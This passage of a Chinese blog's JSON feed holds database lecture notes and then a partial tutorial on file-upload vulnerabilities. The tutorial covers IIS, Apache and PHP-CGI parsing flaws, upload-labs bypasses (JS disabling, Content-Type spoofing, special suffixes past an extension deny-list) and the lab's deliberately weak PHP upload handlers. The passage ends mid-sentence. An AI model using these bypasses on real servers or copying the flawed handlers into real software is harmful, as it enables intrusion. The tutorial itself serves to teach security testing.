title=\"数据由DBMS统一管理和控制\"></a>数据由DBMS统一管理和控制</h3><p>DBMS提供的数据控制功能 </p>\n<p>(1)数据的安全性（Security）保护 保护数据，以防止不合法的使用造成的数据的泄密和破坏。</p>\n<p>(2)数据的完整性（Integrity）检查 将数据控制在有效的范围内，或保证数据之间满足一定的关系。 </p>\n<p>(3)并发（Concurrency）控制 对多用户的并发操作加以控制和协调，防止相互干扰而得到错误的结果。 </p>\n<p>(4)数据库恢复（Recovery） 将数据库从错误状态恢复到某一已知的正确状态。</p>\n<h1 id=\"1-2数据模型\"><a href=\"#1-2数据模型\" class=\"headerlink\" title=\"1.2数据模型\"></a>1.2数据模型</h1><p>在数据库中用数据模型这个工具来抽象、表示和处理现实世界中的数据和信息。<br>通俗地讲数据模型就是现实世界的模拟。 </p>\n<p>数据模型应满足三方面要求 </p>\n<ol>\n<li>能比较真实地模拟现实世界 </li>\n<li>容易为人所理解 </li>\n<li>便于在计算机上实现</li>\n</ol>\n<p>注：数据模型是数据库系统的核心和基础</p>\n<h2 id=\"1-2-1两大类数据模型（了解）\"><a href=\"#1-2-1两大类数据模型（了解）\" class=\"headerlink\" title=\"1.2.1两大类数据模型（了解）\"></a>1.2.1两大类数据模型（了解）</h2><ol>\n<li>概念模型<br>也称信息模型，它是按用户的观点来对信息和信息建模，用于数据库设计</li>\n<li>逻辑模型：主要包括网状模型、层次模型、关系模型、面向对象模型等，按计算机系统的观点对数据建模，用于DBMS实现。<br>物理模型：是对数据最底层的抽象，描述数据在系统内部的表示方式和存取方法，在磁盘或磁带上的存储方式和存取方法。</li>\n</ol>\n<h2 id=\"1-2-2概念模型\"><a href=\"#1-2-2概念模型\" class=\"headerlink\" title=\"1.2.2概念模型\"></a>1.2.2概念模型</h2><p>概念模型：</p>\n<ul>\n<li>概念模型用于信息世界的建模 </li>\n<li>是现实世界到机器世界的一个中间层次 </li>\n<li>是数据库设计的有力工具 数据库设计人员和用户之间进行交流的语言</li>\n</ul>\n<p>对概念模型的基本要求：</p>\n<ul>\n<li>较强的语义表达能力 </li>\n<li>能够方便、直接地表达应用中的各种语义知识 </li>\n<li>简单、清晰、易于用户理解</li>\n</ul>\n<h3 id=\"信息世界中的基本概念\"><a href=\"#信息世界中的基本概念\" class=\"headerlink\" title=\"信息世界中的基本概念\"></a>信息世界中的基本概念</h3><ol>\n<li><p>实体（Entity）  客观存在并可相互区别的事物称为实体。 可以是具体的人、事、物或抽象的概念。 </p>\n</li>\n<li><p>属性（Attribute）  实体所具有的某一特性称为属性。 一个实体可以由若干个属性来刻画。   </p>\n</li>\n<li><p>码（Key）  唯一标识实体的属性集称为码。</p>\n</li>\n<li><p>域（Domain）  属性的取值范围称为该属性的域。</p>\n</li>\n<li><p>实体型（Entity Type）  用实体名及其属性名集合来抽象和刻画同类实体称为实体型 </p>\n</li>\n<li><p>实体集（Entity Set）  同一类型实体的集合称为实体集</p>\n</li>\n<li><p>联系（Relationship）   现实世界中事物内部以及事物之间的联系在信息世界中反映为实体内部的联系和实体之间的联系。 </p>\n<p><code>实体内部</code>的联系通常是指组成实体的各属性之间的联系 </p>\n<p><code>实体之间</code>的联系通常是指不同实体集之间的联系</p>\n</li>\n</ol>\n<h3 id=\"概念模型的一种表示方法\"><a href=\"#概念模型的一种表示方法\" class=\"headerlink\" title=\"概念模型的一种表示方法\"></a>概念模型的一种表示方法</h3><p>概念模型的表示方法—E-R图、<strong>实体－联系方法</strong>(E-R方法) </p>\n<ul>\n<li>用E-R图来描述现实世界的概念模型 </li>\n<li>E-R方法也称为E-R模型</li>\n</ul>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905112912981.png\" alt=\"image-20220905112912981\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905112937613.png\" alt=\"image-20220905112937613\"></p>\n<h2 id=\"1-2-3数据模型的组成要素（三个）\"><a href=\"#1-2-3数据模型的组成要素（三个）\" class=\"headerlink\" title=\"1.2.3数据模型的组成要素（三个）\"></a>1.2.3数据模型的组成要素（三个）</h2><h3 id=\"数据结构\"><a href=\"#数据结构\" class=\"headerlink\" title=\"数据结构\"></a>数据结构</h3><p>数据结构描述数据库的组成对象，以及对象之间的联系</p>\n<p>对系统静态的描述</p>\n<h3 id=\"数据操作\"><a href=\"#数据操作\" class=\"headerlink\" title=\"数据操作\"></a>数据操作</h3><p>对数据库中的对象的实例（值）允许执行的操作以及相关的操作规则，对系统动态的描述</p>\n<h3 id=\"完整性约束条件\"><a href=\"#完整性约束条件\" class=\"headerlink\" title=\"完整性约束条件\"></a>完整性约束条件</h3><p>一组完整性规则的集合。 </p>\n<p>完整性规则：给定的数据模型中数据及其联系所具有的制约和储存规则 </p>\n<p>用以限定符合数据模型的数据库状态以及状态的变化，以保证数据的正确、有效、相容。</p>\n<h2 id=\"1-2-4最常用的数据模型\"><a href=\"#1-2-4最常用的数据模型\" class=\"headerlink\" title=\"1.2.4最常用的数据模型\"></a>1.2.4最常用的数据模型</h2><p>非关系模型 </p>\n<p>层次模型(Hierarchical Model) 网状模型(Network Model) </p>\n<p>关系模型(Relational Model)   面向对象模型(Object Oriented Model）<br>对象关系模型(Object Relational Model)</p>\n<p>基本层次联系是指两个记录以及它们之间的一对多（包括一对一）的联系</p>\n<h2 id=\"1-2-5层次模型\"><a href=\"#1-2-5层次模型\" class=\"headerlink\" title=\"1.2.5层次模型\"></a>1.2.5层次模型</h2><h3 id=\"1、层次模型的数据结构\"><a href=\"#1、层次模型的数据结构\" class=\"headerlink\" title=\"1、层次模型的数据结构\"></a>1、层次模型的数据结构</h3><p>在数据库中定义满足下面两个条件的基本层次联系的集合为层次模型</p>\n<ol>\n<li>有且只有一个节点没有双亲结点，这个结点被称为根结点</li>\n<li>根以外的其他结点有且只有一个双亲结点</li>\n</ol>\n<p>每个结点表示一个记录类型，记录类型之间的联系用结点之间的连线表示，这种联系是父子之间的一对多的关系</p>\n<h3 id=\"2、层次模型的数据操纵与完整性约束\"><a href=\"#2、层次模型的数据操纵与完整性约束\" class=\"headerlink\" title=\"2、层次模型的数据操纵与完整性约束\"></a>2、层次模型的数据操纵与完整性约束</h3><p>层次模型的数据操纵主要有查询、插入、删除和更新，操纵时要保证层次模型完整性约束条件</p>\n<h3 id=\"3、层次模型的优缺点\"><a href=\"#3、层次模型的优缺点\" class=\"headerlink\" title=\"3、层次模型的优缺点\"></a>3、层次模型的优缺点</h3><p>优点：</p>\n<ol>\n<li>层次模型的数据结构比较简单清晰</li>\n<li>层次数据库的查询效率高</li>\n<li>层次数据模型提供了良好的完整性支撑</li>\n</ol>\n<p>缺点：</p>\n<ol>\n<li>现实世界中很多联系是非层次性的，如结点之间具有多对多联系，不适合层次模型表示</li>\n<li>如果一个结点具有多个双亲结点编写很复杂</li>\n<li>查询子女结点必须通过双亲结点</li>\n<li>由于结构严密，层次命令趋于程序化</li>\n</ol>\n<h2 id=\"1-2-6网状模型\"><a href=\"#1-2-6网状模型\" class=\"headerlink\" title=\"1.2.6网状模型\"></a>1.2.6网状模型</h2><h3 id=\"1、网状模型的数据结构\"><a href=\"#1、网状模型的数据结构\" class=\"headerlink\" title=\"1、网状模型的数据结构\"></a>1、网状模型的数据结构</h3><p>在数据库中满足下面两个条件的基本层次联系集合称为网状模型</p>\n<ol>\n<li>允许一个以上的结点无双亲</li>\n<li>一个结点可以有对于一个的双亲</li>\n</ol>\n<h3 id=\"2、网状模型的数据操纵与完整性约束\"><a href=\"#2、网状模型的数据操纵与完整性约束\" class=\"headerlink\" title=\"2、网状模型的数据操纵与完整性约束\"></a>2、网状模型的数据操纵与完整性约束</h3><ol>\n<li>支持记录码的概念，码即唯一标识记录的数据项的集合</li>\n<li>保证一个联系中双亲记录和子女记录之间是一对多的关系</li>\n<li>可以支持双亲和子女记录之间</li>\n</ol>\n<h3 id=\"3、网状模型的优缺点\"><a href=\"#3、网状模型的优缺点\" class=\"headerlink\" title=\"3、网状模型的优缺点\"></a>3、网状模型的优缺点</h3><p>优点：</p>\n<ol>\n<li>能够更为直接的描述现实世界，如一个结点可以有多个双亲，结点之间可以有多种联系</li>\n<li>具有良好的性能，存取效率较高</li>\n</ol>\n<p>缺点：</p>\n<ol>\n<li>结构比较复杂，而且伴随着应环境的扩大，数据库的结构就变得越来越复杂</li>\n</ol>\n<h2 id=\"1-2-7关系模型\"><a href=\"#1-2-7关系模型\" class=\"headerlink\" title=\"1.2.7关系模型\"></a>1.2.7关系模型</h2><p>关系数据库系统采用关系模型作为数据的组织方式 </p>\n<h3 id=\"1、关系数据模型的数据结构\"><a href=\"#1、关系数据模型的数据结构\" class=\"headerlink\" title=\"1、关系数据模型的数据结构\"></a>1、关系数据模型的数据结构</h3><p>在用户观点下，关系模型中数据的逻辑结构是一张二维表，它由行和列组成。</p>\n<ul>\n<li>关系（Relation） 一个关系对应通常说的一张表 </li>\n<li>元组（Tuple） 表中的一行即为一个元组 </li>\n<li>属性（Attribute）   表中的一列即为一个属性，给每一个属性起一个名称即属性名</li>\n<li>主码（Key） 表中的某个属性组，它可以唯一确定一个元组。 </li>\n<li>域（Domain） 属性的取值范围。 </li>\n<li>分量 元组中的一个属性值。 </li>\n<li>关系模式 对关系的描述</li>\n</ul>\n<p>关系必须是规范化的，满足一定的规范条件<br>最基本的规范条件：关系的每一个分量必须是一个不可分的数据项,  不允许表中还有表 </p>\n<h3 id=\"2、关系数据模型的操纵与完整性约束\"><a href=\"#2、关系数据模型的操纵与完整性约束\" class=\"headerlink\" title=\"2、关系数据模型的操纵与完整性约束\"></a>2、关系数据模型的操纵与完整性约束</h3><ul>\n<li>数据操作是集合操作，操作对象和操作结果都是关系</li>\n<li>数据操作是集合操作，操作对象和操作结果都是关系，即若干元组的集合 </li>\n<li>存取路径对用户透明&#x2F;隐蔽，用户只要指出“干什么”，不必详细说明“怎么干”</li>\n</ul>\n<h3 id=\"3、关系数据模型的优缺点\"><a href=\"#3、关系数据模型的优缺点\" class=\"headerlink\" title=\"3、关系数据模型的优缺点\"></a>3、关系数据模型的优缺点</h3><p>优点：</p>\n<ol>\n<li>建立在严格的数学概念的基础上 </li>\n<li>概念单一<br>实体和各类联系都用关系来表示<br>对数据的检索结果也是关系 </li>\n<li>关系模型的存取路径对用户透明<br>具有更高的数据独立性，更好的安全保密性<br>简化了程序员的工作和数据库开发建立的工作</li>\n</ol>\n<p>缺点：</p>\n<ol>\n<li>存取路径对用户透明导致查询效率往往不如非关系数据模型 </li>\n<li>为提高性能，必须对用户的查询请求进行优化    增加了开发DBMS的难度</li>\n</ol>\n<h1 id=\"1-3数据库系统结构\"><a href=\"#1-3数据库系统结构\" class=\"headerlink\" title=\"1.3数据库系统结构\"></a>1.3数据库系统结构</h1><h3 id=\"1-3-1数据库系统模式的概念\"><a href=\"#1-3-1数据库系统模式的概念\" class=\"headerlink\" title=\"1.3.1数据库系统模式的概念\"></a>1.3.1数据库系统模式的概念</h3><h4 id=\"模式\"><a href=\"#模式\" class=\"headerlink\" title=\"模式\"></a>模式</h4><ul>\n<li>数据库全体数据逻辑结构和特征的描述</li>\n<li>是型的描述</li>\n<li>反映的是数据的结构及其联系</li>\n<li>模式是相对稳定的</li>\n</ul>\n<p>型是对一类型的结构和属性的说明<br>值是型的一个具体赋值</p>\n<h3 id=\"1-3-2数据库系统的三级映像\"><a href=\"#1-3-2数据库系统的三级映像\" class=\"headerlink\" title=\"1.3.2数据库系统的三级映像\"></a>1.3.2数据库系统的三级映像</h3><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914203111627.png\" alt=\"image-20220914203111627\"></p>\n<h4 id=\"1、模式\"><a href=\"#1、模式\" class=\"headerlink\" title=\"1、模式\"></a>1、模式</h4><ol>\n<li><p>模式也叫逻辑结构</p>\n<ul>\n<li><p>数据库中全体数据的逻辑结构和特征的描述</p>\n</li>\n<li><p>所有用户的公共数据视图，综合了所有用户的需求</p>\n</li>\n</ul>\n</li>\n<li><p>一个数据库只有一个模式</p>\n</li>\n<li><p>模式的地位：是数据库系统模式结构的中间层</p>\n<ul>\n<li>与数据的物理存储细节和硬件环境无关</li>\n<li>与具体的应用程序、开发工具及高级程序设计语言无关</li>\n</ul>\n</li>\n</ol>\n<p>逻辑结构：数据记录由哪些数据项组成，数据项的名字，类型，取值范围等，而且要定义数据之间的联系，与数据有关的安全性，完整性操作。</p>\n<h4 id=\"2、外模式\"><a href=\"#2、外模式\" class=\"headerlink\" title=\"2、外模式\"></a>2、外模式</h4><ol>\n<li><p>外模式也叫做子模式</p>\n<ul>\n<li><p>数据库用户（包括应用程序员和最终用户）使用的局部数据的逻辑结构和特征的描述 </p>\n</li>\n<li><p>数据库用户的数据视图，是与某一应用有关的数据的逻辑表示</p>\n</li>\n</ul>\n</li>\n<li><p>外模式的地位：介于模式与应用之间</p>\n<ul>\n<li>模式与外模式的关系：一对多</li>\n</ul>\n<p>外模式是模式的子集，一个数据库可以有多个外模式反应了不同的用户的应用需求、看待数据的方式、对数据保密的要求</p>\n<p>对模式中同一数据，在外模式中的结构、类型、长度、保密级别等都可以不同</p>\n<ul>\n<li>外模式与应用的关系：一对多</li>\n</ul>\n<p>同一外模式也可以为某一用户的多个应用系统所使用<br>但一个应用程序只能使用一个外模式</p>\n</li>\n<li><p>外模式的用途</p>\n<ul>\n<li>保证数据库安全性的一个有力措施</li>\n<li>每个用户只能看见和访问所对应的外模式中的数据</li>\n</ul>\n</li>\n</ol>\n<p>外模式是从模式导出的一个子集，包含模式中允许特定用户使用的那部分数据。用户可以通过外模式描述语言来描述、定义对应于用户的数据记录(外模式)，也可以利用数据操纵语言(DML)对这些数据记录进行。外模式反映了数据库的用户观。</p>\n<h4 id=\"3、内模式\"><a href=\"#3、内模式\" class=\"headerlink\" title=\"3、内模式\"></a>3、内模式</h4><ol>\n<li><p>内模式也称为储存模式</p>\n<ul>\n<li><p>是数据物理结构和储存方式的描述</p>\n</li>\n<li><p>是数据在数据库内部的表示方式</p>\n<ul>\n<li>记录的存储方式（顺序存储，按照B树结构存储，按hash方法存储）</li>\n<li>索引的组织方式</li>\n<li>数据是否压缩存储</li>\n<li>数据是否加密</li>\n<li>数据存储记录结构的规定</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>一个数据库只有一个内模式</p>\n</li>\n</ol>\n<h3 id=\"1-3-3数据库的二级映像域数据独立性\"><a href=\"#1-3-3数据库的二级映像域数据独立性\" class=\"headerlink\" title=\"1.3.3数据库的二级映像域数据独立性\"></a>1.3.3数据库的二级映像域数据独立性</h3><ol>\n<li><p>三级模式是对数据的三个抽象级别</p>\n</li>\n<li><p>二级映象在DBMS内部实现这三个抽象层次的联系和转换</p>\n<ul>\n<li><p>外模式／模式映像</p>\n</li>\n<li><p>模式／内模式映像</p>\n</li>\n</ul>\n</li>\n</ol>\n<h4 id=\"外模式／模式映像\"><a href=\"#外模式／模式映像\" class=\"headerlink\" title=\"外模式／模式映像\"></a>外模式／模式映像</h4><p>保证数据的逻辑独立性:</p>\n<ul>\n<li>当模式改变时，数据库管理员修改有关的外模式&#x2F;模式映象，使外模式保持不变</li>\n<li>应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。</li>\n</ul>\n<h4 id=\"模式／内模式映像\"><a href=\"#模式／内模式映像\" class=\"headerlink\" title=\"模式／内模式映像\"></a>模式／内模式映像</h4><ol>\n<li>模式／内模式映象定义了数据全局逻辑结构与存储结构之间的对应关系。</li>\n<li>数据库中模式／内模式映象是唯一的</li>\n<li>该映象定义通常包含在模式描述中</li>\n<li>保证数据的物理独立性<ul>\n<li>当数据库的存储结构改变了（例如选用了另一种存储结构），数据库管理员修改模式／内模式映象，使模式保持不变</li>\n<li>应用程序不受影响。保证了数据与程序的物理独立性，简称数据的物理独立性。</li>\n</ul>\n</li>\n<li>数据库的二级映像<ul>\n<li>保证了数据库外模式的稳定性</li>\n<li>从底层保证了应用程序的稳定性，除非应用需求本身发生变化，否则应用程序一般不需要修改</li>\n</ul>\n</li>\n<li>数据与程序之间的独立性，使得数据的定义和描述可以从应用程序中分离出去 </li>\n<li>数据的存取由DBMS管理<ul>\n<li>用户不必考虑存取路径等细节</li>\n<li>简化了应用程序的编制</li>\n<li>大大减少了应用程序的维护和修改</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"1-4数据库系统的组成\"><a href=\"#1-4数据库系统的组成\" class=\"headerlink\" title=\"1.4数据库系统的组成\"></a>1.4数据库系统的组成</h1><ol>\n<li><p>数据库</p>\n</li>\n<li><p>数据库管理系统（及其开发工具）</p>\n</li>\n<li><p>应用系统</p>\n</li>\n<li><p>数据库管理员</p>\n</li>\n<li><p>硬件平台及数据库</p>\n<ul>\n<li>足够大的内存—操作系统、DBMS的核心模块 、数据缓冲区、 应用程序</li>\n<li>足够大的外存—–磁盘或磁盘阵列（数据库）、光盘、磁带（数据备份）</li>\n<li>较高的通道能力，提高数据传送率</li>\n</ul>\n</li>\n<li><p>软件</p>\n<ul>\n<li>DBMS</li>\n<li>支持DBMS运行的操作系统</li>\n<li>与数据库接口的高级语言及其编译系统</li>\n<li>以DBMS为核心的应用开发工具</li>\n<li>为特定应用环境开发的数据库应用系统</li>\n</ul>\n</li>\n<li><p>人员</p>\n<ul>\n<li><p>数据库管理员</p>\n<p>1.决定数据库中的信息内容和结构<br>2.决定数据库的存储结构和存取策略<br>3.定义数据的安全性要求和完整性约束条件<br>4.监控数据库的使用和运行</p>\n<ul>\n<li>周期性转储数据库</li>\n<li>系统故障恢复</li>\n<li>介质故障恢复</li>\n<li>监视审计文件</li>\n</ul>\n<p>5.数据库的改进和重组</p>\n<ul>\n<li>性能监控和调优</li>\n<li>定期对数据库进行重组织，以提高系统的性能</li>\n<li>需求增加和改变时，数据库须需要重构造</li>\n</ul>\n</li>\n<li><p>系统分析员和数据库设计人员</p>\n<ul>\n<li>系统分析员</li>\n</ul>\n<ol>\n<li>负责应用系统的需求分析和规范说明</li>\n<li>与用户及DBA协商，确定系统的硬软件配置</li>\n<li>参与数据库系统的概要设计</li>\n</ol>\n<ul>\n<li>数据库设计人员<ol>\n<li>参加用户需求调查和系统分析</li>\n<li>确定数据库中的数据</li>\n<li>设计数据库各级模式</li>\n</ol>\n</li>\n</ul>\n</li>\n<li><p>应用程序员</p>\n<ul>\n<li>设计和编写应用系统的程序模块</li>\n<li>进行调试和安装</li>\n</ul>\n</li>\n<li><p>用户</p>\n<ul>\n<li>偶然用户</li>\n<li>简单用户</li>\n<li>复杂用户</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n",
            "tags": [
                "数据库",
                "数据库概述"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "url": "https://blog.xcu.icu/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "title": "文件上传小结",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>[TOC]</p>\n<h1 id=\"文件上传漏洞\"><a href=\"#文件上传漏洞\" class=\"headerlink\" title=\"文件上传漏洞\"></a>文件上传漏洞</h1><p>在文件上传漏洞中，文件上传本身没什么问题，重点是文件上传到服务器后，服务器怎么解析上传的文件，上传漏洞的成因是开发者没有对用户上传的文件进行严格的过滤，攻击者可以上传危险文件</p>\n<h1 id=\"解析漏洞\"><a href=\"#解析漏洞\" class=\"headerlink\" title=\"解析漏洞\"></a>解析漏洞</h1><p>攻击者利用上传漏洞通常会与web容器的解析漏洞相结合，下面简单记录一下常见的web容器的解析漏洞</p>\n<h2 id=\"IIS解析漏洞\"><a href=\"#IIS解析漏洞\" class=\"headerlink\" title=\"IIS解析漏洞\"></a>IIS解析漏洞</h2><ol>\n<li>iis中当文件夹命名为【*.asa】或者【**.asp】时，其目录下的所有文件都会被当作asp文件来解析</li>\n<li>当文件为*.asp;1.jpg时，IIS6.0同样会将文件当作asp解析</li>\n</ol>\n<h2 id=\"Apache解析漏洞\"><a href=\"#Apache解析漏洞\" class=\"headerlink\" title=\"Apache解析漏洞\"></a>Apache解析漏洞</h2><p>Apache解析文件时有一个原则就是当碰到不认识的扩展名的时候会从后向前解析，知道遇到认识的为止，如果都不认识则会暴漏其源码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">其认识的文件扩展名在&#x2F;conf&#x2F;mime.types文件下记录<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015200221694.png\" alt=\"image-20221015200221694\"></p>\n<h2 id=\"PHP-CGI解析漏洞\"><a href=\"#PHP-CGI解析漏洞\" class=\"headerlink\" title=\"PHP CGI解析漏洞\"></a>PHP CGI解析漏洞</h2><p>在php的配置文件中cgi.fi:x_pathinfo在部分版本中默认开启，多数存在于nginx与php的组合中，当末尾文件不存在时，会向前递归解析</p>\n<h1 id=\"简单waf绕过\"><a href=\"#简单waf绕过\" class=\"headerlink\" title=\"简单waf绕过\"></a>简单waf绕过</h1><p>下面两张是upload-labs中的图，总结了文件上传常见waf的测试方法和绕过思路</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015201545404.png\" alt=\"image-20221015201545404\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015201347065.png\" alt=\"image-20221015201347065\"></p>\n<p>想要绕过限制，首先要得知道，开发人员通常通过哪些方法防止文件上传漏洞</p>\n<ol>\n<li>客户端验证：客户端使用Javascript检测，在文件未上传的时候就对文件进行检测</li>\n<li>服务端验证：在服务端检查文件的mime类型，扩展名是否合法，检查文件内容等等</li>\n</ol>\n<h1 id=\"下面基于upload的绕过总结\"><a href=\"#下面基于upload的绕过总结\" class=\"headerlink\" title=\"下面基于upload的绕过总结\"></a>下面基于upload的绕过总结</h1><h2 id=\"前端JS绕过\"><a href=\"#前端JS绕过\" class=\"headerlink\" title=\"前端JS绕过\"></a>前端JS绕过</h2><h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>浏览器禁用js验证</p>\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>用burp抓包修改</p>\n<p>将后缀名改成php</p>\n<h2 id=\"Content-Type（mime）绕过\"><a href=\"#Content-Type（mime）绕过\" class=\"headerlink\" title=\"Content-Type（mime）绕过\"></a>Content-Type（mime）绕过</h2><p>所谓Content-Type就是互联网媒体类型也就是MIME类型，决定浏览器将以什么形式、什么编码读取这个文件</p>\n<p>先判断我们用POST方式提交(标签名为submit)的变量是否存在，如果存在，则接下来判断upload这个文件夹是否存在，如果存在则继续判断我们上传文件的文件类型，如果其文件类型为image&#x2F;jpeg或者为image&#x2F;png或者为image&#x2F;gif，那么让temp_file这个变量获取存储在服务器中文件的临时名称，然后让img_path这个变量为upload+&#x2F;+被上传文件的名称。再进行判断如果move_uploaded_file()函数返回ture(也就是成功将文件移动到img_path路径下)那么is_upload变量为true，即上传成功</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$is_upload &#x3D; false;\n$msg &#x3D; null;\nif (isset($_POST[&#39;submit&#39;]))&#x2F;&#x2F;判断我们用POST方式提交(标签名为submit)的变量是否存在\n&#123;\n    if (file_exists(UPLOAD_PATH)) &#x2F;&#x2F;判断upload这个文件夹是否存在\n    &#123;\n        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#x2F;&#x2F;判断我们上传文件的文件类型\n        &#123;\n            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];\n            $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]&#x2F;&#x2F;upload+&#x2F;+文件名\n            if (move_uploaded_file($temp_file, $img_path)) &#x2F;&#x2F;将文件移动到img_path路径下\n            &#123;\n                $is_upload &#x3D; true;\n            &#125; else &#123;\n                $msg &#x3D; &#39;上传出错！&#39;;\n            &#125;\n        &#125; else &#123;\n            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;\n        &#125;\n    &#125; else &#123;\n        $msg &#x3D; UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>isset()，用于检测变量是否设置，并且不是 NULL。如果该变量存在且非空则返回TRUE，否则返回FALSE</p>\n<p>file_exists()，检查文件或目录是否存在。如果指定的文件或目录存在则返回 true，否则返回 false。</p>\n<p>move_uploaded_file(),将上传的文件移动到新位置若成功，则返回 true，否则返回 false。</p>\n<p>$FILES，FILES 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $*FILES 为二维数组；如果为多个文件上传，那么 $*FILES 为三维数组。_</p>\n<p>$_FILES<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==\">‘userfile’</span>客户端文件的原名称。</p>\n<p>$_FILES<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==\">‘userfile’</span>文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image&#x2F;gif”。</p>\n<p>$_FILES<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==\">‘userfile’</span>文件被上传后在服务端储存的临时文件名</p>\n<h3 id=\"绕过方法\"><a href=\"#绕过方法\" class=\"headerlink\" title=\"绕过方法\"></a>绕过方法</h3><p>进行抓包，将Content-Type修改为允许上传的类型（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）三选一。 </p>\n<h2 id=\"黑名单检测\"><a href=\"#黑名单检测\" class=\"headerlink\" title=\"黑名单检测\"></a>黑名单检测</h2><h3 id=\"特殊后缀绕过\"><a href=\"#特殊后缀绕过\" class=\"headerlink\" title=\"特殊后缀绕过\"></a>特殊后缀绕过</h3><p>所谓黑名单就是限制了哪些不可以上传，除去黑名单上的限制都可以。所以我们只要构造黑名单之外的后缀名即可绕过</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$is_upload &#x3D; false;\n$msg &#x3D; null;\nif (isset($_POST[&#39;submit&#39;])) &#123;\n    if (file_exists(UPLOAD_PATH)) &#123;\n        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);&#x2F;&#x2F;定义数组\n        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);&#x2F;&#x2F;移除字符串两侧的空白字符\n        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点\n        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);&#x2F;&#x2F;查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符   \n        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写\n        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA\n        &#x2F;&#x2F;php在windows的时候如果文件名+&quot;::$DATA&quot;会把其之后的数据当成文件流处理，不会检测后缀名。 且保持&quot;:: $DATA&quot;之前的文件名   1.php::$DATA  &#x3D;&#x3D;1.php\n        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空 \n\n        if(!in_array($file_ext, $deny_ext))&#x2F;&#x2F;搜索$deny_ext这个数组里的$file_ext，且有为真\n        &#123;\n            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];\n            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) &#123;\n                 $is_upload &#x3D; true;\n            &#125; else &#123;\n                $msg &#x3D; &#39;上传出错！&#39;;\n            &#125;\n        &#125; else &#123;\n            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;\n        &#125;\n    &#125; else &#123;\n        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>strrchr()</strong> 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符</p>\n<p><strong>array()</strong> 函数用于创建数组。</p>\n<p><strong>数组类型：</strong></p>\n<p><strong>数值数组</strong></p>\n<p>带有数字 ID 